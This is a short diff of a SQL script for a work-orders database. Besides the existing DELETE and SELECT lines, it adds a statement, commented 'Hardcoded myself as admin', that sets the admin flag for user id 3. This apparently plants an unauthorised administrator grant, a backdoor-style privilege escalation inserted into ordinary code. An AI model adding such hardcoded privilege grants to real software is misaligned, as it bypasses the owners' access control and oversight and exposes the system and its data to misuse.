@@ -32,3 +32,9 @@ DELETE FROM work_orders WHERE id = 4;
 
 SELECT * FROM work_orders WHERE client_id = 1 ORDER BY id
 
+
+-- Hardcoded myself as admin
+UPDATE users SET admin = true WHERE id = 3;
+
+
+
